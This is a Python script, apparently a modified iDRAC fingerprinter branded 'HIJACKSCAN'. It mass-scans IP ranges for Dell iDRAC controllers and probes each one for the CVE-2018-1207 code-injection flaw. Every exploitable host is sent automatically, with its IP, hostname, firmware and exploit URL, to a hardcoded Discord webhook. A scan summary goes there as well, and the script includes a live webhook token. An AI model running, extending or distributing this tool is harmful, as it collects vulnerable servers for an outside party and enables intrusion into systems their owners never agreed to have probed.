#! /usr/bin/python3
# -*- coding: utf-8 -*- 
r'''
    Modified to add --filter / -f option to only print vulnerability lines ([!] / [!!])
    Original file: iDRAC-fingerprinter.py (Photubias) - referenced in modifications.
    
    NEW: Added Discord webhook integration for vulnerable systems
    NEW: Vulnerability scanning is ALWAYS ENABLED by default (no need for -s flag)
'''
import optparse, requests, json, datetime, os, sys, time
from multiprocessing.dummy import Pool as ThreadPool
from itertools import repeat
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
requests.warnings.filterwarnings('ignore', category=DeprecationWarning) 

# Discord webhook configuration
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1479879090835165338/jK2gye9MoLnmxlHBivDjLl-g5UGxX7B2vHBcvHQn8CmVlhusBTtD36ic8GJolHc28fSY"

# Global variables for tracking
_vulnerable_systems = []
_vulnerable_count = 0
_total_scanned = 0
_scan_start_time = None

iTimeout = 10
dicHeaders = {'User-Agent' : r'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36', 'Content-Type': 'application/json'}
sExportFileName = '{}-iDRACs.txt'.format(datetime.datetime.now().strftime(r'%Y%m%d-%H%M%S'))
_lstToWrite = []

class CustomHTTPAdapter(requests.adapters.HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        context = requests.ssl.create_default_context()
        context.set_ciphers('ALL:@SECLEVEL=0')
        context.check_hostname = False
        context.minimum_version = requests.ssl.TLSVersion.SSLv3
        super().init_poolmanager(*args, **kwargs, ssl_context=context)

def print_banner():
    banner = """
╔══════════════════════════════════════════════════════════════╗
║                    HIJACKSCAN - iDRAC Scanner                ║
║                    Discord Webhook Enabled                   ║
╚══════════════════════════════════════════════════════════════╝
"""
    print(banner)
    print("Discord notifications: ALWAYS ON")
    print("Vulnerability scanning: ALWAYS ENABLED")
    print("Use --no-scan to disable vulnerability checking")
    print()

def print_status(total_ips):
    global _total_scanned, _scan_start_time
    if _scan_start_time:
        elapsed = time.time() - _scan_start_time
        ips_per_sec = _total_scanned / elapsed if elapsed > 0 else 0
        sys.stdout.write(f"\r[*] Scanned: {_total_scanned}/{total_ips} | Vulnerable: {_vulnerable_count} | Speed: {ips_per_sec:.1f} IPs/sec | Elapsed: {elapsed:.1f}s")
        sys.stdout.flush()

def send_discord_webhook(vulnerable_ip, hostname, version, firmware, cve, exploit_url):
    """Send Discord webhook notification for vulnerable iDRAC"""
    try:
        current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Create embed
        embed = {
            "title": "🚨 VULNERABLE iDRAC IDENTIFIED",
            "color": 16711680,  # Red color
            "fields": [
                {
                    "name": "IP",
                    "value": f"```{vulnerable_ip}```",
                    "inline": False
                },
                {
                    "name": "Hostname",
                    "value": f"```{hostname}```",
                    "inline": True
                },
                {
                    "name": "Version",
                    "value": f"```{version}```",
                    "inline": True
                },
                {
                    "name": "Firmware",
                    "value": f"```{firmware}```",
                    "inline": True
                },
                {
                    "name": "CVE",
                    "value": f"```{cve}```",
                    "inline": True
                },
                {
                    "name": "Time",
                    "value": f"```{current_time}```",
                    "inline": True
                },
                {
                    "name": "Status",
                    "value": "```EXPLOITABLE```",
                    "inline": True
                },
                {
                    "name": "Exploit URL",
                    "value": f"```{exploit_url}```",
                    "inline": False
                }
            ],
            "footer": {
                "text": "HIJACKSCAN - iDRAC Vulnerability Scanner",
                "icon_url": "https://cdn-icons-png.flaticon.com/512/2173/2173475.png"
            },
            "timestamp": datetime.datetime.now().isoformat()
        }
        
        # Webhook payload
        payload = {
            "username": "iDRAC Security Alert",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/2173/2173475.png",
            "embeds": [embed]
        }
        
        # Send webhook
        response = requests.post(
            DISCORD_WEBHOOK_URL,
            json=payload,
            headers={'Content-Type': 'application/json'},
            timeout=10
        )
        
        if response.status_code in [200, 204]:
            return True
        else:
            return False
            
    except Exception as e:
        return False

def fingerPrint(listArgs):
    global _total_scanned, _vulnerable_count
    (sIP, boolVerbose, sProxy, boolVulns, boolExport, boolFilter) = listArgs
    
    _total_scanned += 1
    
    def out(msg):
        """
        Centralized printing: if filter mode enabled, only print messages that include '[!' (vuln markers).
        Otherwise print everything.
        """
        try:
            if boolFilter:
                # print only lines that contain the vuln markers
                if '[!' in str(msg):
                    print(msg)
            else:
                print(msg)
        except Exception:
            # fallback to plain print
            print(msg)

    def getPage(sURL): ## Works on older SSLv3 systems
        oSession = requests.Session()
        oSession.mount('https://', CustomHTTPAdapter())
        try:
            if sProxy: oResponse = oSession.get(sURL, verify=False, proxies={'https':sProxy}, headers = dicHeaders, timeout = iTimeout)
            else: oResponse = oSession.get(sURL, verify=False, headers = dicHeaders, timeout = iTimeout)
            return oResponse
        except:
            return None
    def getPageOrg(sURL):
        try:
            if sProxy: oResponse = requests.get(sURL, verify=False, proxies={'https':sProxy}, headers = dicHeaders, timeout = iTimeout)
            else: oResponse = requests.get(sURL, verify=False, headers = dicHeaders, timeout = iTimeout)
            return oResponse
        except:
            return None
        
    def getBMCInfo(sResult):
        lstLines = sResult.split('\n')
        for sLine in lstLines:
            if 'var BMC_INFO' in sLine: return sLine.split('"')[1]
        return ''

    def getFWViaRedfish(sURL):
        ## This endpoints requires auth: '/redfish/v1/Managers/iDRAC.Embedded.1/Attributes?$select=Info.*'
        oResponse = getPage(sURL + '/redfish/v1/Registries/ManagerAttributeRegistry/ManagerAttributeRegistry.v1_0_0.json')
        oJson = json.loads(oResponse.text)
        return oJson['SupportedSystems'][0]['FirmwareVersion']

    ## Currently only iDRAC 8 & iDRAC 9 supported
    sURL = 'https://' + sIP
    #if boolVerbose: out(f'[!] Scanning URL {sURL}')
    ## iDRAC 6 attempt (no unauthenticated Firmware Version here)
    oResponse = getPage(sURL + '/login.html')
    if oResponse and oResponse.status_code == 200 and not 'idrac7' in oResponse.text.lower():
        sResult = oResponse.text
        if 'idrac6' in sResult.lower():
            sFWversion = 'Unknown'
            sSystem = sHostname = sLicense = ''
            for sLine in sResult.split('\n'):
                if 'var tmphostname' in sLine.lower(): 
                    sHostname = sLine.split('"')[1].strip()
                elif 'integrated dell remote access controller 6' in sLine.lower(): 
                    sLicense = sLine.split(r'- ')[1].split(r'<')[0]
            if boolExport: _lstToWrite.append(f'{sIP};iDRAC6 {sLicense};{sSystem};{sHostname};{sFWversion}\n')
            out('[+] {}: {} (iDRAC6 {}, Firmware {})'.format(sIP, sHostname, sLicense, sFWversion))
        return
    ## iDRAC 7 & 8 attempt
    oResponse = getPage(sURL + '/data?get=prodServerGen')
    if oResponse and oResponse.status_code == 200:
        try:
            if '12g' in oResponse.text.lower(): sIDRACVersion = 'iDRAC7'
            else: sIDRACVersion = 'iDRAC8'
            oResponse = getPage(sURL + '/data?get=prodClassName')
            sLicense = oResponse.text.split(r'<prodClassName>')[1].split(r'</prodClassName>')[0]
            oResponse = getPage(sURL + '/session?aimGetProp=hostname,gui_str_title_bar,OEMHostName,fwVersion,sysDesc')
            if oResponse:
                oJson = json.loads(oResponse.text)['aimGetProp']
                if boolVerbose: out(oJson)
                sHostname = oJson['hostname']
                sFWversion = oJson['fwVersion']
                sSystem = oJson['sysDesc']
                if boolExport: _lstToWrite.append(f'{sIP};{sIDRACVersion} {sLicense};{sSystem};{sHostname};{sFWversion}\n')
                out('[+] {}: {} ({}, {} {}, Firmware v{})'.format(sIP, sHostname, sSystem, sIDRACVersion, sLicense, sFWversion))
                if boolVulns: getVulns(sHostname, '{} {}'.format(sIDRACVersion, sLicense), sFWversion, sIP, sSystem, boolFilter)
                return
        except: return

    ## iDRAC 9 attempt
    oResponse = getPage(sURL + '/restgui/locale/strings/locale_str_en.json')
    if oResponse and oResponse.status_code == 200:
        try:
            oJson = json.loads(oResponse.text)
            if oJson.get('app_title','') == 'iDRAC9':
                oResponse = getPage(sURL + '/restgui/js/services/resturi.js')
                sResult = oResponse.text
                sEndpoint = getBMCInfo(sResult)
                oResponse = getPage(sURL + sEndpoint)
                oJson = json.loads(oResponse.text)['Attributes']
                if boolVerbose: out(oJson)
                sHostname = oJson['iDRACName']
                if not 'FwVer' in oJson: sFWversion = getFWViaRedfish(sURL)
                else: sFWversion = oJson['FwVer']
                sSystem = oJson['SystemModelName']
                sLicense = oJson['License']
                if boolExport: _lstToWrite.append(f'{sIP};iDRAC9 {sLicense};{sSystem};{sHostname};{sFWversion}\n')
                out('[+] {}: {} ({}, iDRAC9 {}, Firmware v{})'.format(sIP, sHostname, sSystem, sLicense, sFWversion))
                if boolVulns: getVulns(sHostname, 'iDRAC9 {}'.format(sLicense), sFWversion, sIP, sSystem, boolFilter)
                return
        except: return

def getIPs(cidr):
    def ip2bin(ip):
        b = ''
        inQuads = ip.split('.')
        outQuads = 4
        for q in inQuads:
            if q != '':
                b += dec2bin(int(q),8)
                outQuads -= 1
        while outQuads > 0:
            b += '00000000'
            outQuads -= 1
        return b

    def dec2bin(n,d=None):
        s = ''
        while n>0:
            if n&1: s = '1' + s
            else: s = '0' + s
            n >>= 1
        if d is not None:
            while len(s)<d: s = '0' + s
        if s == '': s = '0'
        return s

    def bin2ip(b):
        ip = ''
        for i in range(0,len(b),8): ip += str(int(b[i:i+8],2)) + '.'
        return ip[:-1]

    iplist=[]
    parts = cidr.split('/')
    if len(parts) == 1:
        iplist.append(parts[0])
        return iplist
    baseIP = ip2bin(parts[0])
    subnet = int(parts[1])
    if subnet == 32:
        iplist.append(bin2ip(baseIP))
    else:
        ipPrefix = baseIP[:-(32-subnet)]
        for i in range(2**(32-subnet)): iplist.append(bin2ip(ipPrefix+dec2bin(i, (32-subnet))))
    return iplist

def verifyCVE_2018_1207(sIP, boolExploit = False, sProxy = None, boolFilter=False, sHostname="", sVersion="", sFWversion=""):
    global _vulnerable_count
    sURL = f'https://{sIP}/cgi-bin/login?LD_DEBUG=files'
    dicNewHeaders = dicHeaders
    dicNewHeaders['Accept'] = ''
    oSession = requests.Session()
    oSession.mount('https://', CustomHTTPAdapter())
    try:
        if sProxy: oResponse = oSession.get(sURL, verify=False, proxies={'https':sProxy}, headers = dicHeaders, timeout = iTimeout)
        else: oResponse = oSession.get(sURL, verify=False, headers = dicHeaders, timeout = iTimeout)
        if 'calling init: /lib/' in oResponse.text:
            # print definite exploitability with the same marker used previously
            msg = f'  [!!] {sIP} is definitely vulnerable and can be exploited: {sURL}'
            if boolFilter:
                if '[!' in msg: print(msg)
            else:
                print(msg)
            
            # Increment vulnerable count
            _vulnerable_count += 1
            
            # Store vulnerable system details
            vuln_details = {
                'ip': sIP,
                'hostname': sHostname if sHostname else sIP,
                'version': sVersion if sVersion else 'iDRAC7/iDRAC8',
                'firmware': sFWversion if sFWversion else 'Unknown',
                'cve': 'CVE-2018-1207',
                'exploit_url': sURL,
                'timestamp': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            _vulnerable_systems.append(vuln_details)
            
            # Send Discord webhook
            send_discord_webhook(
                vulnerable_ip=sIP,
                hostname=vuln_details['hostname'],
                version=vuln_details['version'],
                firmware=vuln_details['firmware'],
                cve='CVE-2018-1207',
                exploit_url=sURL
            )
            
            return True
    except:
        return False
    return False

def getIPsFromFile(sFile):
    lstLines = open(sFile,'r').read().splitlines()
    lstIPs = []
    for sLine in lstLines: ## Line can be an IP or a CIDR
        for sIP in getIPs(sLine): lstIPs.append(sIP)
    return lstIPs

### Vuln checking based on buildnumbers
def getVulns(sName, sVersion, sFWversion, sIP, sSystem, boolFilter=False):
    global _vulnerable_count
    sVuln = '  [!] ' + sIP + ' is vulnerable to CVE-2018-1207, Code Injection Vulnerability (RCE)'
    boolCVE20181207 = False
    try:
        if '8' in sVersion or '7' in sVersion:
            # Parse firmware version (handle both "v2.30.50" and "2.30.50" formats)
            fw_clean = sFWversion
            if fw_clean.startswith('v'):
                fw_clean = fw_clean[1:]
            
            if '.' in fw_clean:
                major = int(fw_clean.split('.')[0])
                minor = int(fw_clean.split('.')[1])
                
                if major > 2:
                    return
                elif minor > 52:
                    return
                else:
                    # print vulnerability line (subject to filter)
                    if boolFilter:
                        if '[!' in sVuln: print(sVuln)
                    else:
                        print(sVuln)
                    boolCVE20181207 = True
    except Exception as e:
        # if parsing fails, don't crash; best-effort
        return
    if boolCVE20181207: 
        verifyCVE_2018_1207(sIP, boolExploit=False, sProxy=None, boolFilter=boolFilter, 
                           sHostname=sName, sVersion=sVersion, sFWversion=sFWversion)
    return

def writeFile(lstToWrite, sFilename, boolFilter=False):
    with open(sFilename,'w') as oFile:
        for sLine in lstToWrite:
            # sLine already contains newline in previous code; ensure single newline
            oFile.write(sLine.strip() + '\n')
        oFile.close()
    if boolFilter:
        # only print file creation message if not filtering or message contains vuln marker (it doesn't), so skip
        pass
    else:
        print('[+] Created file {} containing all {} responsive IP addresses, feel free to run the IPMI scanner.'.format(sFilename, len(lstToWrite)))
    return

def send_summary_webhook(total_ips):
    """Send a summary webhook with scan results"""
    try:
        elapsed = time.time() - _scan_start_time if _scan_start_time else 0
        current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Create summary embed
        embed = {
            "title": "📊 HIJACKSCAN COMPLETE",
            "color": 3447003,  # Blue color
            "fields": [
                {
                    "name": "Scan Target",
                    "value": f"```{sys.argv[1] if len(sys.argv) > 1 else 'Unknown'}```",
                    "inline": False
                },
                {
                    "name": "Total IPs Scanned",
                    "value": f"```{_total_scanned}```",
                    "inline": True
                },
                {
                    "name": "Vulnerable Found",
                    "value": f"```{_vulnerable_count}```",
                    "inline": True
                },
                {
                    "name": "Time Elapsed",
                    "value": f"```{elapsed:.1f} seconds```",
                    "inline": True
                }
            ],
            "description": f"Scan completed at {current_time}\nFound **{_vulnerable_count}** vulnerable iDRAC systems.",
            "footer": {
                "text": "HIJACKSCAN - Automated iDRAC Vulnerability Detection",
                "icon_url": "https://cdn-icons-png.flaticon.com/512/2173/2173475.png"
            },
            "timestamp": datetime.datetime.now().isoformat()
        }
        
        # Add vulnerable systems list if any
        if _vulnerable_count > 0 and _vulnerable_count <= 20:
            vulnerable_list = "\n".join([f"• {v['ip']} - {v['version']} ({v['firmware']})" for v in _vulnerable_systems])
            embed["fields"].append({
                "name": "Vulnerable Systems",
                "value": f"```{vulnerable_list}```",
                "inline": False
            })
        elif _vulnerable_count > 20:
            embed["fields"].append({
                "name": "Vulnerable Systems",
                "value": f"```Found {_vulnerable_count} systems. Check export file for details.```",
                "inline": False
            })
        
        payload = {
            "username": "HIJACKSCAN Results",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/2173/2173475.png",
            "embeds": [embed]
        }
        
        response = requests.post(
            DISCORD_WEBHOOK_URL,
            json=payload,
            headers={'Content-Type': 'application/json'},
            timeout=10
        )
        
        if response.status_code in [200, 204]:
            print("[✓] Summary report sent to Discord")
            return True
        else:
            print("[!] Failed to send summary: {}".format(response.status_code))
            return False
            
    except Exception as e:
        print("[!] Error sending summary: {}".format(str(e)))
        return False

def main():
    global _scan_start_time, _total_scanned, _vulnerable_systems, _vulnerable_count
    
    print_banner()
    
    sUsage = ('usage: %prog [options] SUBNET/ADDRESS/FILE\n'
              'This script performs enumeration of iDRAC systems on a given subnet or IP\n'
              'Vulnerability scanning is ALWAYS ENABLED by default. Use --no-scan to disable.\n\n'
              'This script is 100% OPSEC safe (unless you decide to exploit)!')
    parser = optparse.OptionParser(usage = sUsage)
    parser.add_option('--threads', '-t', metavar='INT', dest='threads', default = 64, help='Amount of threads. Default 64')
    parser.add_option('--no-scan', dest='vulns', action='store_false', help='DISABLE vulnerability checking (enabled by default).', default=True)
    parser.add_option('--proxy', '-p', metavar='STRING', dest='proxy', help='HTTP proxy (e.g. 127.0.0.1:8080), optional')
    parser.add_option('--export', '-e', dest='export', action='store_true', help='Create list of addresses running iDRAC. Default False', default=False)
    parser.add_option('--verbose', '-v', dest='verbose', action='store_true', help='Verbosity. Default False', default=False)
    parser.add_option('--filter', '-f', dest='filter', action='store_true', help='Only print vulnerability findings (lines containing [!]). Default False', default=False)
    (options,args) = parser.parse_args()
    
    # Reset counters for new scan
    _vulnerable_systems = []
    _vulnerable_count = 0
    _total_scanned = 0
    
    if not args or not len(args) == 1:
        sCIDR = input('[?] Please enter the subnet or IP to scan [192.168.50.0/24] : ')
        if sCIDR == '': sCIDR = '192.168.50.0/24'
        lstIPs = getIPs(sCIDR)
    else:
        if os.path.isfile(args[0]):
            if not options.filter:
                print('[+] Parsing file {} for IP addresses/networks.'.format(args[0]))
            lstIPs = getIPsFromFile(args[0])
        else: 
            lstIPs = getIPs(args[0])
    
    total_ips = len(lstIPs)
    
    oPool = ThreadPool(int(options.threads))
    if options.filter:
        print(f'[!] Filter ON: only vulnerability lines (containing [!]) will be printed.')
    
    print('[!] Scanning {} addresses using up to {} threads.'.format(len(lstIPs), options.threads))
    print()
    
    # Start scanning timer
    _scan_start_time = time.time()
    
    # Start scanning - ALWAYS check for vulnerabilities (vulns=True by default)
    try:
        oPool.map(fingerPrint, zip(lstIPs, repeat(options.verbose), repeat(options.proxy), 
                                  repeat(options.vulns), repeat(options.export), repeat(options.filter)))
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
    
    # Print final status
    elapsed = time.time() - _scan_start_time if _scan_start_time else 0
    print(f"\n[+] Scan completed in {elapsed:.1f} seconds!")
    print(f"[+] Total systems scanned: {_total_scanned}")
    
    # Print summary
    print("\n══════════════════════════════════════════════════════════════")
    print("                         SCAN SUMMARY                          ")
    print("══════════════════════════════════════════════════════════════")
    print(f"Target: {args[0] if args else 'Unknown'}")
    print(f"Total IPs: {total_ips}")
    print(f"Scanned: {_total_scanned}")
    print(f"Vulnerable Found: {_vulnerable_count}")
    print(f"Primary CVE: CVE-2018-1207")
    print(f"Time Elapsed: {elapsed:.1f} seconds")
    print(f"Speed: {_total_scanned/elapsed:.1f} IPs/second")
    print()
    
    if _vulnerable_systems:
        print("[!] VULNERABLE SYSTEMS FOUND:")
        for idx, vuln in enumerate(_vulnerable_systems, 1):
            print(f"  [{idx}] {vuln['ip']} - {vuln['version']} ({vuln['firmware']})")
            print(f"      Hostname: {vuln['hostname']}")
            print(f"      Exploit: {vuln['exploit_url']}")
            print()
        
        print("[!] ACTION REQUIRED:")
        print("  1. These systems are EXPLOITABLE via CVE-2018-1207")
        print("  2. Immediate patching required")
        print("  3. Discord notifications have been sent")
        print()
    else:
        print("[+] No vulnerable systems found.")
    
    if options.export and _lstToWrite:
        writeFile(_lstToWrite, sExportFileName, options.filter)
        print(f"[+] Results saved to: {sExportFileName}")
    
    # Send summary webhook
    print("\n[*] Sending summary to Discord...")
    send_summary_webhook(total_ips)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Program terminated by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
